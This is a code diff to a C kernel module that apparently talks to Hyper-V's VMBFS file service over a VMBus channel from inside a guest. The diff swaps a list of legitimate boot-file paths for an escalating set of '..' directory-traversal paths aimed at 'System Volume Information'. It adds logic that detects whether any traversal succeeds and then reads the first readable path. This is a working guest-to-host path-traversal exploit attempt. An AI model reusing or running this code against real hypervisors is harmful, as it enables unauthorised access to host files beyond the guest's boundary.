@@ -23,14 +23,42 @@ struct frame {
 } __packed;
 
 static const char *const paths[] = {
-	"\\.",
-	"\\vmlinux",
-	"\\vmlinuz",
-	"\\kernel.vmgs",
-	"\\reference_info.cose",
-	"\\EFI\\BOOT\\BOOTX64.EFI",
-	"\\boot\\kernel",
-	"\\missing-3900000",
+	"\\..",
+	"\\..\\System Volume Information",
+	"\\..\\missing-3900000",
+	"\\..\\..",
+	"\\..\\..\\System Volume Information",
+	"\\..\\..\\missing-3900000",
+	"\\..\\..\\..",
+	"\\..\\..\\..\\System Volume Information",
+	"\\..\\..\\..\\missing-3900000",
+	"\\..\\..\\..\\..",
+	"\\..\\..\\..\\..\\System Volume Information",
+	"\\..\\..\\..\\..\\missing-3900000",
+	"\\..\\..\\..\\..\\..",
+	"\\..\\..\\..\\..\\..\\System Volume Information",
+	"\\..\\..\\..\\..\\..\\missing-3900000",
+	"\\..\\..\\..\\..\\..\\..",
+	"\\..\\..\\..\\..\\..\\..\\System Volume Information",
+	"\\..\\..\\..\\..\\..\\..\\missing-3900000",
+	"\\..\\..\\..\\..\\..\\..\\..",
+	"\\..\\..\\..\\..\\..\\..\\..\\System Volume Information",
+	"\\..\\..\\..\\..\\..\\..\\..\\missing-3900000",
+	"\\..\\..\\..\\..\\..\\..\\..\\..",
+	"\\..\\..\\..\\..\\..\\..\\..\\..\\System Volume Information",
+	"\\..\\..\\..\\..\\..\\..\\..\\..\\missing-3900000",
+	"\\..\\..\\..\\..\\..\\..\\..\\..\\..",
+	"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\System Volume Information",
+	"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\missing-3900000",
+	"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..",
+	"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\System Volume Information",
+	"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\missing-3900000",
+	"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..",
+	"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\System Volume Information",
+	"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\missing-3900000",
+	"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..",
+	"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\System Volume Information",
+	"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\missing-3900000",
 };
 
 static struct vmbus_channel *channel;
@@ -47,6 +75,7 @@ static unsigned char rx[512];
 static unsigned int phase;
 static unsigned int path_index;
 static unsigned int readable_index = UINT_MAX;
+static bool depth_hit;
 
 static void put32(void *destination, u32 value)
 {
@@ -165,14 +194,19 @@ static void hvraw_callback(void *context)
 
 			pr_info("VMBFS_INFO path=%s status=%u flags=%u size=%llu\n",
 				paths[path_index], status, flags, size);
-			if (status == 0 && !(flags & 1) && size &&
+			if (status == 0 && path_index % 3 != 2)
+				depth_hit = true;
+			if (status == 0 && path_index % 3 != 2 && !(flags & 1) && size &&
 			    readable_index == UINT_MAX)
 				readable_index = path_index;
-			if (++path_index < ARRAY_SIZE(paths)) {
-				send_info(path_index);
+			if (path_index % 3 != 2) {
+				if (++path_index < ARRAY_SIZE(paths))
+					send_info(path_index);
 			} else if (readable_index != UINT_MAX) {
 				path_index = readable_index;
 				send_read(path_index);
+			} else if (!depth_hit && ++path_index < ARRAY_SIZE(paths)) {
+				send_info(path_index);
 			}
 		} else if (message == VMBFS_READ_RESPONSE) {
 			u32 returned = pipe_length >= 12 ? pipe_length - 12 : 0;
